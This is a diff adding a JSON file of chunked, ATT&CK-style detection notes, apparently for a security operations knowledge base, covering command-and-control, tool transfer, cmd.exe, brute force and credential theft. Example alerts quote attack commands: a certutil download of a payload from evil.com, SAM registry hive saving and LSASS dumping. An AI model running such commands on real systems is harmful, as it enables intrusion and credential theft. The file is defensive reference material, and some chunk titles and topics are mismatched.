@@ -1,0 +1,4573 @@
+[
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "c2_t1071_t1105.md",
+    "chunk_id": "mitre-c2_t1071_t1105-chunk-0",
+    "title": "Application Layer Protocol",
+    "text": "# Application Layer Protocol\n\n**Technique ID:** T1071\n**Tactic:** Command and Control",
+    "topic": "Command and Control",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1071",
+      "T1090",
+      "T1568",
+      "T1105",
+      "T1059",
+      "T1140"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "c2_t1071_t1105.md",
+    "chunk_id": "mitre-c2_t1071_t1105-chunk-1",
+    "title": "Application Layer Protocol",
+    "text": "## Description\nAdversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.",
+    "topic": "Command and Control",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1071",
+      "T1090",
+      "T1568",
+      "T1105",
+      "T1059",
+      "T1140"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "c2_t1071_t1105.md",
+    "chunk_id": "mitre-c2_t1071_t1105-chunk-2",
+    "title": "Application Layer Protocol",
+    "text": "## Attacker Behavior\nAttackers use standard web protocols like HTTP (TCP 80) or HTTPS (TCP 443) for Command and Control (C2) beacons. They may also use DNS, SMTP, or FTP.",
+    "topic": "Command and Control",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1071",
+      "T1090",
+      "T1568",
+      "T1105",
+      "T1059",
+      "T1140"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "c2_t1071_t1105.md",
+    "chunk_id": "mitre-c2_t1071_t1105-chunk-3",
+    "title": "Application Layer Protocol",
+    "text": "## SOC Evidence\n- High volume of periodic, small HTTP GET or POST requests to an unknown external IP or domain (beaconing).\n- DNS queries for excessively long or seemingly random subdomains (DNS tunneling).\n- Connections to suspicious Top Level Domains (TLDs).",
+    "topic": "Command and Control",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1071",
+      "T1090",
+      "T1568",
+      "T1105",
+      "T1059",
+      "T1140"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "c2_t1071_t1105.md",
+    "chunk_id": "mitre-c2_t1071_t1105-chunk-4",
+    "title": "Application Layer Protocol",
+    "text": "## Detection Clues\nLook for regular communication patterns (e.g., a connection exactly every 60 seconds with little jitter). Analyze HTTP User-Agent strings for anomalies or default tooling values.",
+    "topic": "Command and Control",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1071",
+      "T1090",
+      "T1568",
+      "T1105",
+      "T1059",
+      "T1140"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "c2_t1071_t1105.md",
+    "chunk_id": "mitre-c2_t1071_t1105-chunk-5",
+    "title": "Application Layer Protocol",
+    "text": "## Related Techniques\n- T1090: Proxy\n- T1568: Dynamic Resolution",
+    "topic": "Command and Control",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1071",
+      "T1090",
+      "T1568",
+      "T1105",
+      "T1059",
+      "T1140"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "c2_t1071_t1105.md",
+    "chunk_id": "mitre-c2_t1071_t1105-chunk-6",
+    "title": "Application Layer Protocol",
+    "text": "## Example Alert Context\nSuricata generates an alert for \"Suspicious HTTP Beaconing\" when it observes 50 identical HTTP GET requests to `http://unknown-domain.xyz/login.php` originating from a single internal host over an hour.",
+    "topic": "Command and Control",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1071",
+      "T1090",
+      "T1568",
+      "T1105",
+      "T1059",
+      "T1140"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "c2_t1071_t1105.md",
+    "chunk_id": "mitre-c2_t1071_t1105-chunk-7",
+    "title": "Application Layer Protocol",
+    "text": "## Wazuh Relevance\nWazuh can detect the endpoint process initiating the connection by analyzing Sysmon Event ID 3 (Network Connection) or by integrating with endpoint firewalls.",
+    "topic": "Command and Control",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1071",
+      "T1090",
+      "T1568",
+      "T1105",
+      "T1059",
+      "T1140"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "c2_t1071_t1105.md",
+    "chunk_id": "mitre-c2_t1071_t1105-chunk-8",
+    "title": "Application Layer Protocol",
+    "text": "## Suricata Relevance\nSuricata is the primary detection tool for this technique. It uses flow analysis, JA3 TLS fingerprinting, and payload inspection to identify C2 frameworks communicating over application protocols.",
+    "topic": "Command and Control",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1071",
+      "T1090",
+      "T1568",
+      "T1105",
+      "T1059",
+      "T1140"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "c2_t1071_t1105.md",
+    "chunk_id": "mitre-c2_t1071_t1105-chunk-9",
+    "title": "Application Layer Protocol",
+    "text": "## Investigation Guidance\nCorrelate the external IP or domain with threat intelligence feeds. Use Wazuh logs to identify which process initiated the network connection and how that process was launched.\n\n---",
+    "topic": "Command and Control",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1071",
+      "T1090",
+      "T1568",
+      "T1105",
+      "T1059",
+      "T1140"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "c2_t1071_t1105.md",
+    "chunk_id": "mitre-c2_t1071_t1105-chunk-10",
+    "title": "Application Layer Protocol",
+    "text": "# Ingress Tool Transfer\n\n**Technique ID:** T1105\n**Tactic:** Command and Control",
+    "topic": "Command and Control",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1071",
+      "T1090",
+      "T1568",
+      "T1105",
+      "T1059",
+      "T1140"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "c2_t1071_t1105.md",
+    "chunk_id": "mitre-c2_t1071_t1105-chunk-11",
+    "title": "Application Layer Protocol",
+    "text": "## Description\nAdversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols.",
+    "topic": "Command and Control",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1071",
+      "T1090",
+      "T1568",
+      "T1105",
+      "T1059",
+      "T1140"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "c2_t1071_t1105.md",
+    "chunk_id": "mitre-c2_t1071_t1105-chunk-12",
+    "title": "Application Layer Protocol",
+    "text": "## Attacker Behavior\nAttackers use built-in tools like `certutil.exe`, `bitsadmin.exe`, `powershell.exe`, or `curl` to download secondary payloads, ransomware encryptors, or post-exploitation frameworks.",
+    "topic": "Command and Control",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1071",
+      "T1090",
+      "T1568",
+      "T1105",
+      "T1059",
+      "T1140"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "c2_t1071_t1105.md",
+    "chunk_id": "mitre-c2_t1071_t1105-chunk-13",
+    "title": "Application Layer Protocol",
+    "text": "## SOC Evidence\n- Process execution logs showing `certutil.exe -urlcache -split -f`.\n- PowerShell `Invoke-WebRequest` or `Net.WebClient.DownloadFile`.\n- Network proxy logs or Suricata alerts showing the download of executable files (`.exe`, `.dll`, `.sh`) from unknown domains.",
+    "topic": "Command and Control",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1071",
+      "T1090",
+      "T1568",
+      "T1105",
+      "T1059",
+      "T1140"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "c2_t1071_t1105.md",
+    "chunk_id": "mitre-c2_t1071_t1105-chunk-14",
+    "title": "Application Layer Protocol",
+    "text": "## Detection Clues\nMonitor for native binaries (LOLBins) making outbound HTTP/HTTPS connections. It is highly suspicious for utilities like `certutil` or `msbuild` to download files from the internet.",
+    "topic": "Command and Control",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1071",
+      "T1090",
+      "T1568",
+      "T1105",
+      "T1059",
+      "T1140"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "c2_t1071_t1105.md",
+    "chunk_id": "mitre-c2_t1071_t1105-chunk-15",
+    "title": "Application Layer Protocol",
+    "text": "## Related Techniques\n- T1059: Command and Scripting Interpreter\n- T1140: Deobfuscate/Decode Files or Information",
+    "topic": "Command and Control",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1071",
+      "T1090",
+      "T1568",
+      "T1105",
+      "T1059",
+      "T1140"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "c2_t1071_t1105.md",
+    "chunk_id": "mitre-c2_t1071_t1105-chunk-16",
+    "title": "Application Layer Protocol",
+    "text": "## Example Alert Context\nWazuh alerts on Sysmon Event ID 1: `certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\Windows\\Temp\\payload.exe`.",
+    "topic": "Command and Control",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1071",
+      "T1090",
+      "T1568",
+      "T1105",
+      "T1059",
+      "T1140"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "c2_t1071_t1105.md",
+    "chunk_id": "mitre-c2_t1071_t1105-chunk-17",
+    "title": "Application Layer Protocol",
+    "text": "## Wazuh Relevance\nWazuh detects the command line execution of the tools used to transfer files. It can also detect the subsequent file creation (Event ID 11) in temporary directories.",
+    "topic": "Command and Control",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1071",
+      "T1090",
+      "T1568",
+      "T1105",
+      "T1059",
+      "T1140"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "c2_t1071_t1105.md",
+    "chunk_id": "mitre-c2_t1071_t1105-chunk-18",
+    "title": "Application Layer Protocol",
+    "text": "## Suricata Relevance\nSuricata can inspect the network stream to detect the download of known malicious files (via file hashes or signatures) or alert on executable files traversing the network perimeter.",
+    "topic": "Command and Control",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1071",
+      "T1090",
+      "T1568",
+      "T1105",
+      "T1059",
+      "T1140"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "c2_t1071_t1105.md",
+    "chunk_id": "mitre-c2_t1071_t1105-chunk-19",
+    "title": "Application Layer Protocol",
+    "text": "## Investigation Guidance\nLocate the downloaded file and submit it to a sandbox or threat intelligence platform for analysis. Trace the execution to see if the payload was successfully run.",
+    "topic": "Command and Control",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1071",
+      "T1090",
+      "T1568",
+      "T1105",
+      "T1059",
+      "T1140"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "cmd_t1059_003.md",
+    "chunk_id": "mitre-cmd_t1059_003-chunk-0",
+    "title": "Command and Scripting Interpreter: Windows Command Shell",
+    "text": "# Command and Scripting Interpreter: Windows Command Shell\n\n**Technique ID:** T1059.003  \n**Tactic:** Execution  \n**Parent Technique:** T1059 - Command and Scripting Interpreter",
+    "topic": "Persistence",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1059.003",
+      "T1059"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "cmd_t1059_003.md",
+    "chunk_id": "mitre-cmd_t1059_003-chunk-1",
+    "title": "Command and Scripting Interpreter: Windows Command Shell",
+    "text": "## Overview\n\nAdversaries may abuse the Windows command shell (`cmd.exe`) to execute commands, batch scripts (`.bat`, `.cmd`), or execute commands indirectly via environment variables or living-off-the-land binaries (LOLBins).",
+    "topic": "Persistence",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1059.003",
+      "T1059"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "cmd_t1059_003.md",
+    "chunk_id": "mitre-cmd_t1059_003-chunk-2",
+    "title": "Command and Scripting Interpreter: Windows Command Shell",
+    "text": "## Execution Patterns\n\n- **Batch Execution:** Execution of `.bat` or `.cmd` files from temporary directories like `C:\\Users\\Public\\`, `C:\\Windows\\Temp\\`, or `C:\\Users\\<user>\\AppData\\Local\\Temp\\`.\n- **Command Chaining:** Using `&`, `&&`, or `||` to execute multiple commands in a single command line (e.g. `whoami & net user & ipconfig /all`).\n- **Indirect Execution via `cmd.exe /c`:** Command shell invoked non-interactively to run discovery or persistence commands.",
+    "topic": "Persistence",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1059.003",
+      "T1059"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "cmd_t1059_003.md",
+    "chunk_id": "mitre-cmd_t1059_003-chunk-3",
+    "title": "Command and Scripting Interpreter: Windows Command Shell",
+    "text": "## Detection Indicators\n\n1. Process creation of `cmd.exe` with arguments containing `whoami`, `net user`, `net localgroup administrators`, `systeminfo`, or `tasklist`.\n2. `cmd.exe` launched by suspicious processes like `wmiprvse.exe`, `rundll32.exe`, or `mshta.exe`.\n3. Pipe redirection (`>`) writing output to temporary text files in public directories.",
+    "topic": "Persistence",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1059.003",
+      "T1059"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "cmd_t1059_003.md",
+    "chunk_id": "mitre-cmd_t1059_003-chunk-4",
+    "title": "Command and Scripting Interpreter: Windows Command Shell",
+    "text": "## Mitigation & Controls\n\n- Audit command line executions via Event ID 4688 with command-line auditing enabled.\n- Restrict interactive `cmd.exe` usage for non-administrative user roles where feasible.",
+    "topic": "Persistence",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1059.003",
+      "T1059"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "credential_access_t1110_t1555.md",
+    "chunk_id": "mitre-credential_access_t1110_t1555-chunk-0",
+    "title": "Brute Force",
+    "text": "# Brute Force\n\n**Technique ID:** T1110\n**Tactic:** Credential Access",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1110",
+      "T1078",
+      "T1133",
+      "T1555",
+      "T1003",
+      "T1081"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "credential_access_t1110_t1555.md",
+    "chunk_id": "mitre-credential_access_t1110_t1555-chunk-1",
+    "title": "Brute Force",
+    "text": "## Description\nAdversaries may use brute force techniques to guess passwords to gain access to accounts. This includes Password Guessing (testing a single password against many accounts) or Password Spraying (testing a few common passwords against many accounts to avoid lockouts).",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1110",
+      "T1078",
+      "T1133",
+      "T1555",
+      "T1003",
+      "T1081"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "credential_access_t1110_t1555.md",
+    "chunk_id": "mitre-credential_access_t1110_t1555-chunk-2",
+    "title": "Brute Force",
+    "text": "## Attacker Behavior\nAttackers use automated scripts or tools like Hydra to rapidly attempt logins against exposed services such as RDP, SSH, FTP, or web portals. In a password spray, they might try `Fall2023!` against the entire Active Directory user list.",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1110",
+      "T1078",
+      "T1133",
+      "T1555",
+      "T1003",
+      "T1081"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "credential_access_t1110_t1555.md",
+    "chunk_id": "mitre-credential_access_t1110_t1555-chunk-3",
+    "title": "Brute Force",
+    "text": "## SOC Evidence\n- A high volume of Windows Security Event ID 4625 (Failed Logon) from a single source IP.\n- Multiple lockouts (Event ID 4740) occurring in a short period.\n- SSH logs showing continuous `Failed password for root` from an external IP.",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1110",
+      "T1078",
+      "T1133",
+      "T1555",
+      "T1003",
+      "T1081"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "credential_access_t1110_t1555.md",
+    "chunk_id": "mitre-credential_access_t1110_t1555-chunk-4",
+    "title": "Brute Force",
+    "text": "## Detection Clues\nImplement thresholds to detect bursts of authentication failures. Differentiate between vertical brute force (many passwords, one user) and horizontal password spraying (few passwords, many users).",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1110",
+      "T1078",
+      "T1133",
+      "T1555",
+      "T1003",
+      "T1081"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "credential_access_t1110_t1555.md",
+    "chunk_id": "mitre-credential_access_t1110_t1555-chunk-5",
+    "title": "Brute Force",
+    "text": "## Related Techniques\n- T1078: Valid Accounts\n- T1133: External Remote Services",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1110",
+      "T1078",
+      "T1133",
+      "T1555",
+      "T1003",
+      "T1081"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "credential_access_t1110_t1555.md",
+    "chunk_id": "mitre-credential_access_t1110_t1555-chunk-6",
+    "title": "Brute Force",
+    "text": "## Example Alert Context\nA Wazuh alert triggers when 50 failed RDP login attempts (Event ID 4625) are recorded targeting the `Administrator` account from a single external IP address within a 2-minute window.",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1110",
+      "T1078",
+      "T1133",
+      "T1555",
+      "T1003",
+      "T1081"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "credential_access_t1110_t1555.md",
+    "chunk_id": "mitre-credential_access_t1110_t1555-chunk-7",
+    "title": "Brute Force",
+    "text": "## Wazuh Relevance\nWazuh excels at brute force detection through log aggregation and correlation. It comes with built-in active response capabilities that can automatically block offending IP addresses at the firewall level upon detecting brute force patterns.",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1110",
+      "T1078",
+      "T1133",
+      "T1555",
+      "T1003",
+      "T1081"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "credential_access_t1110_t1555.md",
+    "chunk_id": "mitre-credential_access_t1110_t1555-chunk-8",
+    "title": "Brute Force",
+    "text": "## Suricata Relevance\nSuricata can detect brute force activity by identifying high rates of repetitive protocol initialization packets (e.g., SSH or RDP handshakes) or by matching specific application-layer error responses (like HTTP 401 Unauthorized) in rapid succession.",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1110",
+      "T1078",
+      "T1133",
+      "T1555",
+      "T1003",
+      "T1081"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "credential_access_t1110_t1555.md",
+    "chunk_id": "mitre-credential_access_t1110_t1555-chunk-9",
+    "title": "Brute Force",
+    "text": "## Investigation Guidance\nDetermine if the brute force attempt was eventually successful by looking for a subsequent Event ID 4624 (Successful Logon) from the same source IP. If successful, investigate the actions taken by the compromised account. If unsuccessful, ensure the source IP is blocked at the perimeter.\n\n---",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1110",
+      "T1078",
+      "T1133",
+      "T1555",
+      "T1003",
+      "T1081"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "credential_access_t1110_t1555.md",
+    "chunk_id": "mitre-credential_access_t1110_t1555-chunk-10",
+    "title": "Brute Force",
+    "text": "# Credentials from Password Stores\n\n**Technique ID:** T1555\n**Tactic:** Credential Access",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1110",
+      "T1078",
+      "T1133",
+      "T1555",
+      "T1003",
+      "T1081"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "credential_access_t1110_t1555.md",
+    "chunk_id": "mitre-credential_access_t1110_t1555-chunk-11",
+    "title": "Brute Force",
+    "text": "## Description\nAdversaries may search for common password storage locations to obtain user credentials. Passwords can be stored in various locations on a system, such as web browsers, password managers, system credential managers, or cleartext configuration files.",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1110",
+      "T1078",
+      "T1133",
+      "T1555",
+      "T1003",
+      "T1081"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "credential_access_t1110_t1555.md",
+    "chunk_id": "mitre-credential_access_t1110_t1555-chunk-12",
+    "title": "Brute Force",
+    "text": "## Attacker Behavior\nAttackers use specialized scripts or binaries to parse web browser databases (e.g., Chrome's \"Login Data\" SQLite database) or extract saved Windows credentials using tools like `vaultcmd`.",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1110",
+      "T1078",
+      "T1133",
+      "T1555",
+      "T1003",
+      "T1081"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "credential_access_t1110_t1555.md",
+    "chunk_id": "mitre-credential_access_t1110_t1555-chunk-13",
+    "title": "Brute Force",
+    "text": "## SOC Evidence\n- Anomalous processes reading files within `C:\\Users\\*\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data`.\n- Execution of commands like `cmdkey /list` or access to `vaultcli.dll`.\n- Unexpected access to password manager applications by unknown binaries.",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1110",
+      "T1078",
+      "T1133",
+      "T1555",
+      "T1003",
+      "T1081"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "credential_access_t1110_t1555.md",
+    "chunk_id": "mitre-credential_access_t1110_t1555-chunk-14",
+    "title": "Brute Force",
+    "text": "## Detection Clues\nMonitor file access to known password storage locations by processes other than the application that owns them. Look for the deployment of known credential stealing malware families (like RedLine Stealer or Raccoon).",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1110",
+      "T1078",
+      "T1133",
+      "T1555",
+      "T1003",
+      "T1081"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "credential_access_t1110_t1555.md",
+    "chunk_id": "mitre-credential_access_t1110_t1555-chunk-15",
+    "title": "Brute Force",
+    "text": "## Related Techniques\n- T1003: OS Credential Dumping\n- T1081: Credentials In Files",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1110",
+      "T1078",
+      "T1133",
+      "T1555",
+      "T1003",
+      "T1081"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "credential_access_t1110_t1555.md",
+    "chunk_id": "mitre-credential_access_t1110_t1555-chunk-16",
+    "title": "Brute Force",
+    "text": "## Example Alert Context\nA Wazuh alert based on Sysmon Event ID 11 (File Create/Access) shows `powershell.exe` attempting to read `Login Data` from the Google Chrome AppData folder.",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1110",
+      "T1078",
+      "T1133",
+      "T1555",
+      "T1003",
+      "T1081"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "credential_access_t1110_t1555.md",
+    "chunk_id": "mitre-credential_access_t1110_t1555-chunk-17",
+    "title": "Brute Force",
+    "text": "## Wazuh Relevance\nWazuh can use Sysmon file access events or File Integrity Monitoring to detect unauthorized access to sensitive credential stores.",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1110",
+      "T1078",
+      "T1133",
+      "T1555",
+      "T1003",
+      "T1081"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "credential_access_t1110_t1555.md",
+    "chunk_id": "mitre-credential_access_t1110_t1555-chunk-18",
+    "title": "Brute Force",
+    "text": "## Suricata Relevance\nSuricata cannot observe local credential theft from password stores. However, it can detect the subsequent exfiltration of these stolen credentials if they are transmitted over unencrypted HTTP or if the C2 communication matches known stealer malware signatures.",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1110",
+      "T1078",
+      "T1133",
+      "T1555",
+      "T1003",
+      "T1081"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "credential_access_t1110_t1555.md",
+    "chunk_id": "mitre-credential_access_t1110_t1555-chunk-19",
+    "title": "Brute Force",
+    "text": "## Investigation Guidance\nIdentify the malicious process extracting the credentials. Assume all credentials stored in the compromised browser or password manager are now known to the attacker. Enforce MFA, reset compromised passwords, and trace the origin of the stealing process.",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1110",
+      "T1078",
+      "T1133",
+      "T1555",
+      "T1003",
+      "T1081"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "credential_dumping_t1003.md",
+    "chunk_id": "mitre-credential_dumping_t1003-chunk-0",
+    "title": "OS Credential Dumping",
+    "text": "# OS Credential Dumping\n\n**Technique ID:** T1003  \n**Sub-techniques:** T1003.001 (LSASS Memory), T1003.002 (Security Account Manager)  \n**Tactic:** Credential Access",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1003",
+      "T1003.001",
+      "T1003.002",
+      "T1003.001",
+      "T1003.002"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "credential_dumping_t1003.md",
+    "chunk_id": "mitre-credential_dumping_t1003-chunk-1",
+    "title": "OS Credential Dumping",
+    "text": "## Overview\n\nAdversaries attempt to extract credentials (plaintext passwords, NTLM hashes, Kerberos tickets) from operating system memory or security databases. Access to credentials allows lateral movement across the domain.",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1003",
+      "T1003.001",
+      "T1003.002",
+      "T1003.001",
+      "T1003.002"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "credential_dumping_t1003.md",
+    "chunk_id": "mitre-credential_dumping_t1003-chunk-2",
+    "title": "OS Credential Dumping",
+    "text": "## Common Techniques & Tools\n\n- **LSASS Dumping (T1003.001):** Memory dumping of `lsass.exe` using Mimikatz, `procdump.exe`, or Comsvcs.dll via `rundll32.exe`.\n- **SAM Registry Hive Copying (T1003.002):** Extracting SAM, SYSTEM, and SECURITY registry hives using `reg.exe save hklm\\sam sam.hiv`.",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1003",
+      "T1003.001",
+      "T1003.002",
+      "T1003.001",
+      "T1003.002"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "credential_dumping_t1003.md",
+    "chunk_id": "mitre-credential_dumping_t1003-chunk-3",
+    "title": "OS Credential Dumping",
+    "text": "## Detection & Indicators\n\n1. Process access to `lsass.exe` with `PROCESS_VM_READ` or `PROCESS_ALL_ACCESS` rights (captured in Sysmon Event ID 10).\n2. Command lines referencing `comsvcs.dll, MiniDump` or `procdump.exe -ma lsass.exe`.\n3. Commands saving registry hives (`reg save`).",
+    "topic": "Credential Access",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1003",
+      "T1003.001",
+      "T1003.002",
+      "T1003.001",
+      "T1003.002"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "defense_evasion_t1027_t1562.md",
+    "chunk_id": "mitre-defense_evasion_t1027_t1562-chunk-0",
+    "title": "Obfuscated/Compressed Files and Information",
+    "text": "# Obfuscated/Compressed Files and Information\n\n**Technique ID:** T1027\n**Tactic:** Defense Evasion",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1027",
+      "T1140",
+      "T1059",
+      "T1562",
+      "T1489",
+      "T1070"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "defense_evasion_t1027_t1562.md",
+    "chunk_id": "mitre-defense_evasion_t1027_t1562-chunk-1",
+    "title": "Obfuscated/Compressed Files and Information",
+    "text": "## Description\nAdversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior for evading signature-based antivirus and heuristic detection.",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1027",
+      "T1140",
+      "T1059",
+      "T1562",
+      "T1489",
+      "T1070"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "defense_evasion_t1027_t1562.md",
+    "chunk_id": "mitre-defense_evasion_t1027_t1562-chunk-2",
+    "title": "Obfuscated/Compressed Files and Information",
+    "text": "## Attacker Behavior\nAttackers use software packers (like UPX), base64 encoding, XOR encryption, or script obfuscators (like Invoke-Obfuscation) to hide strings, URLs, and malicious logic from security controls.",
+    "topic": "PowerShell Execution",
+    "platform": "MITRE ATT&CK",
+    "techniques": [
+      "T1027",
+      "T1140",
+      "T1059",
+      "T1562",
+      "T1489",
+      "T1070"
+    ]
+  },
+  {
+    "source": "MITRE",
+    "category": "attack-technique",
+    "document": "defense_evasion_t1027_t1562.md",
+    "chunk_id": "mitre-defense_evasion_t1027_t1562-chunk-3",
+    "title": "Obfuscated/Compressed Files and Information",
